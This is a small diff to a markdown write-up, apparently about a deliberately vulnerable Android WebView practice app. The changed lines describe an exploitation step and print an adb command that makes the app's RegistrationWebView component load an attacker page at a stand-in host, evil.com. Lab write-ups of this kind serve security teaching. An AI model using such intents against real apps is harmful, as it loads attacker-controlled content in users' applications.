@@ -36,9 +36,10 @@
 
 `exploitation:`
 
- =>For to exploit the vulnerability  we will send an intent to the vulnerable component using `adb` this will open a malicious web page provided by the attacker:
+ => For to exploit the vulnerability  we will send an intent to the vulnerable component using `adb` this will open a malicious web page provided by the attacker:
 
- =>we use this command for the same:
+ => we use this command for the same:
+ 
  ```shell
  adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es  reg_url "https://www.evil.com"
  ```
